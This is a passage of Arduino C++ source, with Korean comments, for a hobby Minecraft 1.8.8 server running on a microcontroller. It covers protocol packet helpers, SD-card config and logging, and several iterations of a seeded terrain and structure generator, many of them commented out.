#define DIRT 3
#define WOOD 17
#define LEAVES 18
#define WHEAT 59
#define STONE 1
#define PORTAL 120
#define CHEST 54
#define TNT 46
#define WATER 9
#define OAK_FENCE 85  // 마인크래프트 1.8.8 기준 참나무 울타리 ID




// ===============================
// 랜덤 seed 기반 deterministic random
// ===============================
uint32_t worldSeed = 221;

uint32_t fastRandom(uint32_t x, uint32_t z) {
  uint32_t n = x * 374761393 + z * 668265263;
  n = (n ^ (n >> 13)) * 1274126177;
  return n ^ worldSeed;
}






// --- [이 알맹이가 반드시 있어야 합니다!] ---
void logToTFT(String msg, uint16_t color) {
  // 화면 로그 줄 수 초과 시 초기화
  if (currentLogLine >= maxLogLines) {
    tft.fillScreen(TFT_NAVY);
    tft.setCursor(0, 0);
    tft.setTextSize(2);
    tft.println("=== [ARDUDOWS MC v10.0] ===");
    currentLogLine = 1;
  }

  tft.setTextColor(color);
  tft.println(msg);
  currentLogLine++;

  // SD 카드에 로그 기록
  File logFile = SD.open("/Ardudows/Programs/Programs_X32/Minecraft_Server/server.arf", FILE_APPEND);
  if (logFile) {
    logFile.println("[" + String(millis()) + "] " + msg);
    logFile.close();
  }
}


// --- [프로토콜 통신 유틸리티] ---
int32_t readVarInt(WiFiClient& client) {
  int32_t value = 0;
  int bitOffset = 0;
  uint8_t b;
  while (true) {
    if (!client.available()) return -1;
    b = client.read();
    value |= (b & 0x7F) << bitOffset;
    if ((b & 0x80) == 0) break;
    bitOffset += 7;
  }
  return value;
}

void writeVarInt(WiFiClient& client, int32_t value) {
  do {
    uint8_t temp = (uint8_t)(value & 0x7F);
    value >>= 7;
    if (value != 0) temp |= 0x80;
    client.write(temp);
  } while (value != 0);
}

void writeString(WiFiClient& client, String s) {
  writeVarInt(client, s.length());
  client.print(s);
}

int getVarIntLen(int32_t v) {
  if (v < 0) return 5;
  if (v < 0x80) return 1;
  if (v < 0x4000) return 2;
  if (v < 0x200000) return 3;
  if (v < 0x10000000) return 4;
  return 5;
}

// --- [채팅 시스템] ---
void sendChatMessage(WiFiClient& client, String msg, uint8_t pos = 1) {
  if (!chatting_enabled) return;
  String jsonMsg = "{\"text\":\"" + msg + "\"}";
  writeVarInt(client, getVarIntLen(0x02) + getVarIntLen(jsonMsg.length()) + jsonMsg.length() + 1);
  writeVarInt(client, 0x02);
  writeString(client, jsonMsg);
  client.write(pos);
}

// --- [설정 파서] ---
void parseServerConfig() {
  if (!SD.exists("/Ardudows/Programs/Programs_X32/Minecraft_Server/server.asf")) {
    logToTFT("[!] No ASF file!", TFT_RED);
    return;
  }
  File f = SD.open("/Ardudows/Programs/Programs_X32/Minecraft_Server/server.asf");
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.startsWith("#") || line.indexOf('=') == -1) continue;
    String key = line.substring(0, line.indexOf('='));
    String val = line.substring(line.indexOf('=') + 1);
    key.trim();
    val.trim();

    if (key == "ChunkSize") world_chunk_size = val.substring(0, val.indexOf('x')).toInt();
    else if (key == "World_Type") world_type = val;
    else if (key == "World_Name") world_name = val;
    else if (key == "User") max_players = val.toInt();
    else if (key == "Ardudows_Control") ardudows_control = (val == "true");
    else if (key == "Chatting") chatting_enabled = (val == "true");
  }
  f.close();
  logToTFT("[SYS] " + world_name + " Ready", TFT_YELLOW);
}

// 2. 초기 지형 전송 함수 (221 지형 생성기 연동 버전)
void sendInitialChunks(WiFiClient& client) {
  // 1.8.8 청크 섹션(16x16x16) 하나를 보내기 위한 규격 크기
  const size_t chunkSize = 12544;
  uint8_t* chunkBuf = (uint8_t*)malloc(chunkSize);
  if (!chunkBuf) {
    logToTFT("Memory Full!", TFT_RED);
    return;
  }
  memset(chunkBuf, 0, chunkSize);

  // 🔥 [핵심] 방장님의 221 지형 생성기 가동!
  // globalChunk.blocks[16][16][64]에 데이터를 채웁니다.
  //generateTerrain221(0, 0);

  // 2. 패킷 버퍼에 블록 데이터 채우기 (Y축 0~15 구간)
  for (int y = 0; y < 16; y++) {
    for (int z = 0; z < 16; z++) {
      for (int x = 0; x < 16; x++) {
        uint16_t blockID = globalChunk.blocks[x][z][y];
        int index = ((y * 256) + (z * 16) + x) * 2;

        // 1.8.8 포맷 (Little Endian 주의)
        chunkBuf[index] = (uint8_t)(blockID << 4);
        chunkBuf[index + 1] = (uint8_t)(blockID >> 4);
      }
    }
  }

  // 3. 밝기(Light) 및 바이옴 데이터 채우기
  memset(chunkBuf + 8192, 0xFF, 4096);  // 하늘에서 빛이 쏟아짐
  memset(chunkBuf + 12288, 1, 256);     // 평원 바이옴

  // 4. 패킷 조립 및 전송 (0x21 Map Chunk)
  // 길이: ID(1) + X(4) + Z(4) + Continuous(1) + Mask(2) + Size(VarInt) + Data(chunkSize)
  int totalPacketLen = 1 + 4 + 4 + 1 + 2 + getVarIntLen(chunkSize) + chunkSize;
  writeVarInt(client, totalPacketLen);
  writeVarInt(client, 0x21);  // Packet ID

  // Chunk X, Z (0, 0) - 빅 엔디안
  for (int i = 0; i < 4; i++) client.write((uint8_t)0);
  for (int i = 0; i < 4; i++) client.write((uint8_t)0);

  client.write((uint8_t)1);  // Ground Up Continuous
  client.write((uint8_t)0x01);
  client.write((uint8_t)0x00);  // Section Mask (비트 0: Y 0~15)

  writeVarInt(client, chunkSize);
  client.write(chunkBuf, chunkSize);
  client.flush();

  free(chunkBuf);  // S3의 소중한 RAM을 돌려줌
  logToTFT("221 Terrain Applied!", TFT_GREEN);
}

// --- [ 100x100 월드 생성을 위한 청크 전송기 ] ---
void sendWorld100x100(WiFiClient& client) {
  // 100x100은 청크 기준 약 -3 ~ +3 범위입니다.
  logToTFT("Generating 100x100...", TFT_YELLOW);

  for (int cz = -31; cz <= 31; cz++) {
    for (int cx = -31; cx <= 31; cx++) {
      sendSpecificChunk(client, cx, cz);
      delay(50);  // S3의 숨통을 틔워주기 위한 미세 지연
      yield();    // 와이파이 연결 유지
    }
  }
  logToTFT("100x100 Ready!", TFT_MAGENTA);
}

// --- [ 특정 좌표 청크 생성 및 전송 ] ---
void sendSpecificChunk(WiFiClient& client, int cx, int cz) {
  const size_t chunkSize = 12544;
  uint8_t* chunkBuf = (uint8_t*)malloc(chunkSize);
  if (!chunkBuf) return;
  memset(chunkBuf, 0, chunkSize);

  // 1. 방장님의 하이브리드 지형 생성기 가동
  // globalChunk 초기화
  memset(globalChunk.blocks, 0, sizeof(globalChunk.blocks));
  globalChunk.x = cx;
  globalChunk.z = cz;

  // 바이옴/구조물 생성 (숲, 지뢰밭, 마을 등)
  //generate221Chunk(globalChunk);
  // 수직 레이어 보강 (광석, 베드락 등)
  // generateTerrain221Internal(cx, cz); // 기존 로직 통합

  // 2. 데이터 직렬화 (Y=0~15)
  for (int y = 0; y < 16; y++) {
    for (int z = 0; z < 16; z++) {
      for (int x = 0; x < 16; x++) {
        uint16_t blockID = globalChunk.blocks[x][z][y];
        int index = ((y * 256) + (z * 16) + x) * 2;
        chunkBuf[index] = (uint8_t)(blockID << 4);
        chunkBuf[index + 1] = (uint8_t)(blockID >> 4);
      }
    }
  }

  // 3. 빛 & 바이옴
  memset(chunkBuf + 8192, 0xFF, 4096);
  memset(chunkBuf + 12288, 1, 256);

  // 4. 패킷 전송
  int totalPacketLen = 1 + 4 + 4 + 1 + 2 + getVarIntLen(chunkSize) + chunkSize;
  writeVarInt(client, totalPacketLen);
  writeVarInt(client, 0x21);  // Map Chunk

  // X, Z 좌표 전송 (빅 엔디안)
  auto writeInt = [&](int32_t v) {
    for (int i = 3; i >= 0; i--) client.write((uint8_t)(v >> (i * 8)));
  };
  writeInt(cx);
  writeInt(cz);

  client.write((uint8_t)1);  // Ground Up
  client.write((uint8_t)0x01);
  client.write((uint8_t)0x00);  // Mask
  writeVarInt(client, chunkSize);
  client.write(chunkBuf, chunkSize);

  free(chunkBuf);
}

// --- [ 100x100 월드를 위한 패킷 전송기 ] ---
void sendChunkPacket(WiFiClient& client, int cx, int cz) {
  const size_t chunkSize = 12544;
  memset(chunkBuffer, 0, chunkSize);

  // 지형 생성 (바이옴 통합본 호출)
  //generateIntegrated221Chunk(cx, cz);

  // 🔥 [초강력 수정] 마크 1.8.8 블록 데이터 매핑 (Y-Z-X)
  for (int y = 0; y < 16; y++) {
    for (int z = 0; z < 16; z++) {
      for (int x = 0; x < 16; x++) {
        uint16_t blockID = globalChunk.blocks[x][z][y];

        // 마크 1.8.8 규격 인덱스 (YZX 순서)
        int packetIdx = (y * 256 + z * 128 + x) * 2;

        if (packetIdx < 8192) {
          // 🔥 [핵심 수정] 1.8.8은 (BlockID << 4 | Meta) 형태의 16비트를
          // Little Endian으로 보내야 합니다.
          uint16_t data = (blockID << 4);
          chunkBuffer[packetIdx] = (uint8_t)(data & 0xFF);             // Low Byte
          chunkBuffer[packetIdx + 1] = (uint8_t)((data >> 8) & 0xFF);  // High Byte
        }
      }
    }
  }

  // 빛 & 바이옴 (이건 잘 나오고 있으니 유지)
  memset(chunkBuffer + 8192, 0xFF, 4096);
  memset(chunkBuffer + 12288, 1, 256);

  // 패킷 전송
  int totalLen = 1 + 4 + 4 + 1 + 2 + getVarIntLen(chunkSize) + chunkSize;
  writeVarInt(client, totalLen);
  writeVarInt(client, 0x21);  // Map Chunk

  auto writeIntBE = [&](int32_t v) {
    for (int i = 3; i >= 0; i--) client.write((uint8_t)(v >> (i * 8)));
  };
  writeIntBE(cx);
  writeIntBE(cz);

  client.write((uint8_t)1);
  client.write((uint8_t)0x01);
  client.write((uint8_t)0x00);
  writeVarInt(client, chunkSize);
  client.write(chunkBuffer, chunkSize);
  client.flush();
}


void send100x100World(WiFiClient& client) {
  logToTFT("Expanding World...", TFT_YELLOW);

  // 플레이어 중심 -3 ~ +3 청크 범위 전송
  for (int cz = -3; cz <= 3; cz++) {
    for (int cx = -3; cx <= 3; cx++) {
      // 1. 지형 생성
      //generateIntegrated221Chunk(cx, cz);

      // 2. 패킷 전송 로직 (기존 sendSpecificChunk 내용)
      sendChunkPacket(client, cx, cz);

      delay(30);  // 네트워크 병목 방지
      yield();
    }
  }
  logToTFT("100x100 World Online!", TFT_GREEN);
}

// ===============================================
// [통합] 221 하이브리드 지형 생성기
// 방장님의 바이옴 + Ardudows 수직 레이어 통합
// ===============================================
/*
void generateIntegrated221Chunk(int cx, int cz) {
  // [수정] memset을 과감히 삭제했습니다.
  // 아래 for문 내의 'else { blocks... = AIR; }'가 그 역할을 대신합니다.
  globalChunk.x = cx;
  globalChunk.z = cz;

  // 1. 기본 Ardudows 수직 레이어 생성 (Bedrock -> Mineral -> Soil -> Surface)
  for (int x = 0; x < CHUNK_SIZE; x++) {
    for (int z = 0; z < CHUNK_SIZE; z++) {
      int worldX = cx * CHUNK_SIZE + x;
      int worldZ = cz * CHUNK_SIZE + z;

      uint32_t randVal = terrainRandom(worldX, worldZ);
      int height = getHeight(worldX, worldZ);
      int soilDepth = 2 + (randVal % 2);

      // 🚀 핵심: 0층부터 15층까지 모든 블록을 명시적으로 지정합니다.
      // 이렇게 하면 이전 청크의 데이터가 남아있지 않고 완전히 덮어씌워집니다.
      for (int y = 0; y < 16; y++) {
        if (y == 0) {
          globalChunk.blocks[x][z][y] = BEDROCK;
        } else if (y < height - soilDepth) {
          globalChunk.blocks[x][z][y] = getMineral(y, randVal + y);
        } else if (y < height) {
          globalChunk.blocks[x][z][y] = DIRT;
        } else if (y == height) {
          // 고도에 따른 눈(Snow) 혹은 잔디(Grass)
          globalChunk.blocks[x][z][y] = (height > 12) ? SNOW : GRASS;
        } else {
          // 지표면 위는 전부 공기(AIR)로 초기화 (memset 대체)
          globalChunk.blocks[x][z][y] = AIR;
        }
      }
    }
  }

  // 2. 221 서버 전용 바이옴 덮어쓰기 (숲, 지뢰밭, 논밭, 마을)
  // 이 함수 내부에서도 memset이 있다면 반드시 제거해야 합니다!
  generate221Chunk(globalChunk);
}
*/

// --- [메인 서버 엔진] ---
// --- [ 1.0 안정화 버전용 전역 버퍼 ] ---


// --- [ 좌표 실시간 저장 강화 ] ---
unsigned long lastSaveTime = 0;
void savePosition(double x, double y, double z) {
  if (millis() - lastSaveTime > 10000) {  // 10초마다 자동 저장
    prefs.putDouble("lastX", x);
    prefs.putDouble("lastY", y);
    prefs.putDouble("lastZ", z);
    lastSaveTime = millis();
    // logToTFT("[AUTO] Pos Saved", TFT_DARKGREY); // 로그 너무 많으면 주석 처리
  }
}

// --- [ 메인 서버 엔진 1.0 ] ---

// --- [ 마인크래프트 전용 문자열 읽기 함수 ] ---
// --- [ 마인크래프트 전용 문자열 읽기 함수 - 정밀 수정본 ] ---
String readString(WiFiClient& client) {
  int32_t len = readVarInt(client);
  if (len <= 0 || len > 32767) return "";

  // 🚀 [해결책] 이름이 16자를 넘으면 강제로 잘라버립니다.
  if (len > 16) {
    // 일단 다 읽어서 버퍼는 비워주되, 반환은 16자만 합니다.
    char* buffer = (char*)malloc(len + 1);
    client.readBytes(buffer, len);
    buffer[16] = '\0';  // 16자 지점에서 강제 종료
    String result = String(buffer);
    free(buffer);
    return result;
  }

  char buffer[len + 1];
  client.readBytes(buffer, len);
  buffer[len] = '\0';
  return String(buffer);
}

void sendJoinGame(WiFiClient& client) {
  uint8_t jb[128];
  int p = 0;
  jb[p++] = 0x01;  // Packet ID

  // Entity ID (4 bytes)
  jb[p++] = 0;
  jb[p++] = 0;
  jb[p++] = 0;
  jb[p++] = 101;
  jb[p++] = 1;   // Gamemode (1: Creative)
  jb[p++] = 0;   // Dimension (0: Overworld)
  jb[p++] = 1;   // Difficulty (1: Normal)
  jb[p++] = 10;  // Max Players (10)

  // Level Type ("default")
  String lt = "default";
  jb[p++] = (uint8_t)lt.length();
  memcpy(&jb[p], lt.c_str(), lt.length());
  p += lt.length();

  jb[p++] = 0;  // Reduced Debug Info (false)

  // [중요] 전체 길이를 먼저 보내고 데이터를 보냄
  writeVarInt(client, p);
  client.write(jb, p);
  client.flush();
}

int serverState = 0;

// --- [지형 및 좌표 전송 보조 함수] ---

// 1. 플레이어 좌표 전송 함수 (sendPosition)
void sendPosition(WiFiClient& client, double x, double y, double z) {
  // 패킷 ID: 0x08 (Player Position And Look)
  // 데이터 크기: x(8), y(8), z(8), yaw(4), pitch(4), flags(1), teleportId(VarInt - 1.8.8 기준)
  // 총 약 34~35바이트
  writeVarInt(client, 34);
  writeVarInt(client, 0x08);

  auto writeDouble = [&](double v) {
    uint64_t u;
    memcpy(&u, &v, 8);
    for (int i = 7; i >= 0; i--) client.write((uint8_t)(u >> (i * 8)));
  };
  auto writeFloat = [&](float v) {
    uint32_t u;
    memcpy(&u, &v, 4);
    for (int i = 3; i >= 0; i--) client.write((uint8_t)(u >> (i * 8)));
  };

  writeDouble(x);
  writeDouble(y);
  writeDouble(z);  // 좌표
  writeFloat(0.0f);
  writeFloat(0.0f);             // Yaw, Pitch
  client.write((uint8_t)0x00);  // Flags
}

// 1. 보간 함수 수정 (정밀도 향상)
float lerp221(float a, float b, float t) {
    float ft = t * 3.1415927f;
    float f = (1.0f - cosf(ft)) * 0.5f;
    return a * (1.0f - f) + b * f;
}

// 2. 높이 계산기 수정 (float 유지)
int getHeight128(int worldX, int worldZ) {
    float scale = 64.0f; // 너무 크면 밋밋하니 64 정도로 조정 추천
    
    // ⚠️ (int) cast를 제거하고 float 연산 유지
    float fx = (float)worldX / scale;
    float fz = (float)worldZ / scale;
    
    int x0 = floor(fx);
    int z0 = floor(fz);
    int x1 = x0 + 1;
    int z1 = z0 + 1;

    float v00 = (float)(terrainRandom(x0, z0) % 100) / 100.0f;
    float v10 = (float)(terrainRandom(x1, z0) % 100) / 100.0f;
    float v01 = (float)(terrainRandom(x0, z1) % 100) / 100.0f;
    float v11 = (float)(terrainRandom(x1, z1) % 100) / 100.0f;

    float tx = fx - (float)x0;
    float tz = fz - (float)z0;

    float i1 = lerp221(v00, v10, tx);
    float i2 = lerp221(v01, v11, tx);
    return 60 + (int)(lerp221(i1, i2, tz) * 40); // 60~100층 사이 생성
}

// 3. 최종 섹션 생성기 (인덱스 버그 수정)
/*
void generateFinal221Section(int cx, int cz, int s) {
    int startY = s * 16;
    memset(chunkBuffer, 0, 8192); // 섹션 버퍼 초기화

    for (int y = 0; y < 16; y++) {
        int absY = startY + y; // 실제 월드 높이

        for (int z = 0; z < 16; z++) {
            for (int x = 0; x < 16; x++) {
                int worldX = cx * 16 + x;
                int worldZ = cz * 16 + z;
                uint16_t block = AIR;

                // 221 서버 섬 (0,0 및 5,-3) 보호 로직
                bool is221Island = ((cx == 0 && cz == 0) || (cx == 5 && cz == -3)) && (x < 8);

                if (is221Island) {
                    if (absY == 0) block = BEDROCK;
                    else if (absY < 7) block = STONE;
                    else if (absY == 7) block = GRASS;
                } else {
                    int height = getHeight128(worldX, worldZ);
                    if (absY == 0) block = BEDROCK;
                    else if (absY < height) {
                        if (absY < height - 3) block = STONE;
                        else block = DIRT;
                    } else if (absY == height) {
                        block = (height > 105) ? SNOW : GRASS;
                    } else if (absY < 62) block = WATER; // 해수면 62층
                }

                // 🚀 인덱스 계산 (y는 반드시 0~15 범위여야 함)
                int idx = (y * 256 + z * 16 + x) * 2;
                uint16_t blockData = (block << 4);
                chunkBuffer[idx] = (uint8_t)(blockData & 0xFF);
                chunkBuffer[idx + 1] = (uint8_t)(blockData >> 8);
            }
        }
    }
}
*/

// ==========================================================
// [통합 완료] 최종 섹션 생성기 (중복 제거 및 버그 수정판)
// ==========================================================
// ==========================================================
// [REMODEL] 200x200x64 221 하드코어 서버 지형 생성기
// ==========================================================

// 해수면 및 맵 리미트 설정
#define SEA_LEVEL 32
#define MAX_MAP_CHUNKS 6 // -6 ~ +6 청크 범위 (약 200x200 블록)

// 221 서버용 다이어트된 높이 계산기 (최고 높이 64층 제한)
int getHeight64(int worldX, int worldZ) {
    // 맵 외곽 경계선 밖은 무조건 깊은 바다로 밀어버림 (싸그리 바다)
    int chunkX = worldX >> 4;
    int chunkZ = worldZ >> 4;
    if (chunkX < -MAX_MAP_CHUNKS || chunkX > MAX_MAP_CHUNKS || 
        chunkZ < -MAX_MAP_CHUNKS || chunkZ > MAX_MAP_CHUNKS) {
        return 15; // 해수면(32)보다 한참 낮게 잡아 바다로 만듦
    }

    float scale = 32.0f; 
    float fx = (float)worldX / scale;
    float fz = (float)worldZ / scale;
    
    int x0 = floor(fx);
    int z0 = floor(fz);
    int x1 = x0 + 1;
    int z1 = z0 + 1;

    float v00 = (float)(terrainRandom(x0, z0) % 100) / 100.0f;
    float v10 = (float)(terrainRandom(x1, z0) % 100) / 100.0f;
    float v01 = (float)(terrainRandom(x0, z1) % 100) / 100.0f;
    float v11 = (float)(terrainRandom(x1, z1) % 100) / 100.0f;

    float tx = fx - (float)x0;
    float tz = fz - (float)z0;

    float i1 = lerp221(v00, v10, tx);
    float i2 = lerp221(v01, v11, tz);
    
    // 기본 25층 + 굴곡 최대 20층 = 25~45층 사이 형성 (y=64 안넘게 차단)
    return 25 + (int)(lerp221(i1, i2, tz) * 20);
}

// 8개 섹션(0~7) 중 실제 블록이 존재하는 0~3 섹션(높이 64)만 정밀 제어
// ==========================================================
// [REBUILD] 200x200x64 221 하드코어 서버 지형 생성기 (인덱싱 교정)
// ==========================================================
/*
void generateFinal221Section(int cx, int cz, int s) {
    int startY = s * 16;
    
    // 🚀 섹션 버퍼(8192바이트)를 매번 AIR(0)로 완벽 초기화하여 잔여 데이터 오염 차단
    memset(chunkBuffer, 0, 8192); 

    uint32_t chunkSeed = terrainRandom(cx, cz);

    // 4번 섹션(y=64) 이상은 공기층이므로 연산 패스하고 순수 AIR 버퍼로 전송
    if (s >= 4) return; 
    
    // 구조물 스폰 확률 결정론적 판정
    bool hasShipwreck = (chunkSeed % 100 < 12) && (cx != 0 || cz != 0); // 12% 난파선
    bool hasMineshaft = (chunkSeed % 100 >= 12 && chunkSeed % 100 < 25); // 13% 폐광
    bool isMinefield = (chunkSeed % 100 >= 25 && chunkSeed % 100 < 35);  // 10% 지뢰밭

    // 🗺️ 마크 1.8.8 표준 규격 정렬: Y -> Z -> X 순서로 루프 기동
    for (int y = 0; y < 16; y++) {
        int absY = startY + y;

        for (int z = 0; z < 16; z++) {
            for (int x = 0; x < 16; x++) {
                int worldX = cx * 16 + x;
                int worldZ = cz * 16 + z;
                uint16_t block = AIR;

                // --------------------------------------------------
                // [성역] 221 본진 섬 보호 로직 (0,0) 및 (5,-3) 고정 주입
                // --------------------------------------------------
                if ((cx == 0 && cz == 0) || (cx == 5 && cz == -3)) {
                    if (x < 8 && z < 8) { // 0.5 청크 스케일 안착
                        if (absY == 0) block = BEDROCK;
                        else if (absY < SEA_LEVEL) block = STONE;
                        else if (absY == SEA_LEVEL) block = GRASS; // 해수면 위에 본진 안착
                        
                        // 2x2 포탈 및 보물상자 배치
                        if (absY == SEA_LEVEL + 1) {
                            if (cx == 0 && cz == 0 && x >= 3 && x <= 4 && z >= 3 && z <= 4) block = PORTAL; // 2x2 포탈
                            if (x == 1 && z == 1) block = CHEST;
                        }
                    } else if (absY < SEA_LEVEL) {
                        block = WATER; // 섬 제외 구역은 바다
                    }
                }
                // --------------------------------------------------
                // [일반] Chaotic 대륙 및 특수 컨텐츠 주입
                // --------------------------------------------------
                else {
                    int height = getHeight64(worldX, worldZ);

                    if (absY == 0) {
                        block = BEDROCK;
                    } 
                    else if (absY < height) {
                        // 기본 레이어 구조 (Stone & Mineral -> Dirt)
                        if (absY < height - 3) {
                            block = getMineral(absY, chunkSeed + absY);
                            
                            // [폐광 컨텐츠] 지하 통로 생성
                            if (hasMineshaft && absY > 5 && absY < 20) {
                                if ((x == 4 || x == 11 || z == 4 || z == 11) && absY % 4 != 0) block = AIR; 
                                if (absY % 5 == 0 && block == AIR) block = OAK_FENCE; // 지지대
                            }
                        } else {
                            block = DIRT;
                        }
                    } 
                    else if (absY == height) {
                        // 표면 레이어 설정 (눈 고도화 및 잔디)
                        block = (height > 40) ? SNOW : GRASS;

                        // [숲/나무 도박] 10% 확률로 나무 기둥 스폰
                        if (block == GRASS && (chunkSeed % 10 == 0)) {
                            if (x % 5 == 0 && z % 5 == 0) block = WOOD;
                        }
                    } 
                    else if (absY < SEA_LEVEL) {
                        block = WATER; // 해수면 처리

                        // [난파선 컨텐츠] 바닷속 나무 잔해
                        if (hasShipwreck && absY > 15 && absY < SEA_LEVEL - 2) {
                            if (x >= 4 && x <= 12 && z >= 6 && z <= 10) {
                                block = (absY == SEA_LEVEL - 3) ? LEAVES : WOOD; 
                                if (x == 8 && z == 8 && absY == 16) block = CHEST; 
                            }
                        }
                    }

                    // [지뢰밭 컨텐츠]
                    if (isMinefield && height >= SEA_LEVEL) {
                        if (absY == height + 1) {
                            if (x == 0 || x == 15 || z == 0 || z == 15) block = OAK_FENCE;
                        }
                        if (absY == height - 1 && (x * z) % 13 == 0) {
                            block = TNT; 
                        }
                    }
                }

                // 🛠️ [정밀 교정] 1.8.8 순정 YZX 상대 인덱스 오프셋 공식 적용
                // Y에 256, Z에 16, X에 1 가중치 적용으로 단층/파먹힘 버그 원천 차단
                int idx = (y * 256 + z * 16 + x) * 2;
                
                uint16_t blockData = (block << 4);
                chunkBuffer[idx] = (uint8_t)(blockData & 0xFF);
                chunkBuffer[idx + 1] = (uint8_t)((blockData >> 8) & 0xFF);
            }
        }
    }
}
*/
// 1. 섹션 생성기: 221 랜드마크 + 1000x1000 대륙 통합
/*
void generateSection16(int cx, int cz, int s) {
  int startY = s * 16;
  memset(chunkBuffer, 0, 8192);  // 0으로 초기화 (AIR)

  for (int z = 0; z < 16; z++) {
    for (int x = 0; x < 16; x++) {
      int worldX = cx * 16 + x;
      int worldZ = cz * 16 + z;

      // 기본 대륙 높이 계산
      int height = getHeight128(worldX, worldZ);

      // [추가] 221 서버 랜드마크 강제 주입 (0,0 및 5,-3)
      if (s == 0) {  // 0번 섹션(0~15층)에만 섬 생성
        if ((cx == 0 && cz == 0) || (cx == 5 && cz == -3)) {
          if (x < 8) height = 8;  // 섬 높이 강제 고정
        }
      }

      for (int y = 0; y < 16; y++) {
        int absoluteY = startY + y;
        uint16_t block = AIR;

        if (absoluteY == 0) block = BEDROCK;
        else if (absoluteY < height) {
          if (absoluteY < height - 3) block = STONE;
          else block = DIRT;
        } else if (absoluteY == height) {
          block = (height > 105) ? SNOW : GRASS;
        } else if (absoluteY < 61) block = WATER;  // 해수면

        // 마크 1.8.8 규격: (y * 256 + z * 16 + x) * 2
        int idx = (y * 256 + z * 16 + x) * 2;
        uint16_t data = (block << 4);
        chunkBuffer[idx] = (uint8_t)(data & 0xFF);
        chunkBuffer[idx + 1] = (uint8_t)(data >> 8);
      }
    }
  }
}
*/

/*
// 2. 초기 지형 전송 함수 (sendInitialChunks)
// Ardudows 지형 생성기 매뉴얼에 따라 레이어를 구성합니다.
void sendInitialChunks(WiFiClient &client) {
    const size_t chunkSize = 12544; // 1.8.8 청크 데이터 표준 크기
    uint8_t* chunkBuf = (uint8_t*)malloc(chunkSize);
    if (!chunkBuf) return; 

    memset(chunkBuf, 0, chunkSize);

    // [221 서버 지형 생성 로직]
    // Layer 0: Bedrock (ID 7)
    // Layers 1-3: Stone (ID 1)
    // Layer 4: Grass Block (ID 2) -> 사진 속 그 섬의 표면!
    for (int y = 0; y < 5; y++) {
        uint8_t blockID = (y == 0) ? 7 : (y < 4 ? 1 : 2);
        for (int z = 0; z < 16; z++) {
            for (int x = 0; x < 16; x++) {
                // 1.8.8은 2바이트(ID 12비트 + 메타 4비트) 구조
                chunkBuf[((y * 256) + (z * 16) + x) * 2] = (blockID << 4);
            }
        }
    }

    // Light 데이터 (밝게 보이게 0xFF 채움)
    memset(chunkBuf + 8192, 0xFF, 4096); 
    // Biome 데이터 (평원 1)
    memset(chunkBuf + 12288, 1, 256);

    // 패킷 송신 (0x21 - Map Chunk)
    writeVarInt(client, 1 + 4 + 4 + 1 + 2 + getVarIntLen(chunkSize) + chunkSize);
    writeVarInt(client, 0x21);
    for (int i = 0; i < 4; i++) client.write((uint8_t)0); // Chunk X (0)
    for (int i = 0; i < 4; i++) client.write((uint8_t)0); // Chunk Z (0)
    client.write((uint8_t)1);                            // Ground Up Continuous
    client.write((uint8_t)0x01); client.write((uint8_t)0x00); // Primary Bit Mask (레이어 1개)
    writeVarInt(client, chunkSize);
    client.write(chunkBuf, chunkSize);

    free(chunkBuf); // S3의 소중한 메모리 해제! 필수!
}
*/

// [에러 해결 2] 함수 이름 통일
// sendChunkPacket128 대신 우리가 만든 sendHugeChunk를 쓰도록 별명 지어주기
void sendChunkPacket128(WiFiClient& client, int cx, int cz) {
  sendHugeChunk(client, cx, cz);
}

// --- [ 1000x1000 지원용 동적 로더 ] ---
void sendDynamicWorld(WiFiClient& client, int playerX, int playerZ) {
  int pCX = playerX >> 4;  // 플레이어의 청크 X
  int pCZ = playerZ >> 4;  // 플레이어의 청크 Z

  // 시야 거리(Render Distance)를 3청크로 설정 (S3 사양 고려)
  for (int cz = pCZ - 3; cz <= pCZ + 3; cz++) {
    for (int cx = pCX - 3; cx <= pCX + 3; cx++) {
      // 범위를 1000x1000으로 제한 (0~999)
      if (cx >= 0 && cx < 1000 && cz >= 0 && cz < 1000) {
        sendChunkPacket128(client, cx, cz);
        yield();  // 와이파이 안 끊기게 숨통 틔워주기
      }
    }
  }
}

void sendPacket(WiFiClient& client, uint8_t* data, size_t len) {
  if (len == 0) return;
  writeVarInt(client, len);
  client.write(data, len);
  client.flush();
}

// --- [메인 서버 엔진: 안정화 & 고성능 통합 버전] ---
// --- [A] 패킷 전송 유틸리티 (길이 자동 계산) ---
// --- [개조된 221 서버 전용 스트리밍 패킷 전송기] ---
void sendPacketHeader(WiFiClient& client, int32_t packetID, size_t dataLen) {
  // 1. 전체 패킷 길이 계산 (ID 길이 + 실제 데이터 길이)
  int32_t totalLen = getVarIntLen(packetID) + dataLen;

  // 2. 헤더 먼저 전송
  writeVarInt(client, totalLen);
  writeVarInt(client, packetID);
}

void send1000x1000Streaming(WiFiClient& client, int playerX, int playerZ) {
  int pCX = playerX >> 4;
  int pCZ = playerZ >> 4;
  int viewDist = 3;  // 성능을 위해 시야 3청크

  for (int cz = pCZ - viewDist; cz <= pCZ + viewDist; cz++) {
    for (int cx = pCX - viewDist; cx <= pCX + viewDist; cx++) {
      // [수정] 범위를 -500 ~ 499로 변경하면 음수 좌표도 대륙이 나옵니다!
      if (cx < -500 || cx >= 500 || cz < -500 || cz >= 500) continue;

      sendHugeChunk(client, cx, cz);
      yield();
    }
  }
}

// 🚀 모든 청크가 달라지게 만드는 핵심!
float getGlobalNoise(int worldX, int worldZ) {
  // 좌표에 따라 고유한 시드를 생성
  uint32_t n = terrainRandom(worldX, worldZ);
  return (float)(n % 1000) / 1000.0f;
}

// [정밀] 1.8.8 규격 섹션 생성 (아파트 현상 방지용)
// [최종 수정] 아파트 현상 원천 차단형 통합 생성기
/*
void generateFinal221Section(int cx, int cz, int s) {
  int startY = s * 16;           // 0, 16, 32, 48... 128까지 섹션별 시작점
  memset(chunkBuffer, 0, 8192);  // 일단 공기(AIR)로 싹 비우기

  for (int y = 0; y < 16; y++) {
    int absY = startY + y;  // 🚀 여기가 핵심! 0~127까지 변해야 함

    for (int z = 0; z < 16; z++) {
      for (int x = 0; x < 16; x++) {
        int worldX = cx * 16 + x;
        int worldZ = cz * 16 + z;
        uint16_t block = AIR;

        // 221 서버 섬 보호 (0,0 및 5,-3) - Z=7 랜드마크
        bool is221Island = ((cx == 0 && cz == 0) || (cx == 5 && cz == -3)) && x < 8;

        if (is221Island) {
          if (absY == 0) block = BEDROCK;
          else if (absY < 7) block = STONE;
          else if (absY == 7) block = GRASS;
          // 7층 위로는 아무것도 안 그림 (AIR)
        } else {
          // Chaotic 지형 생성
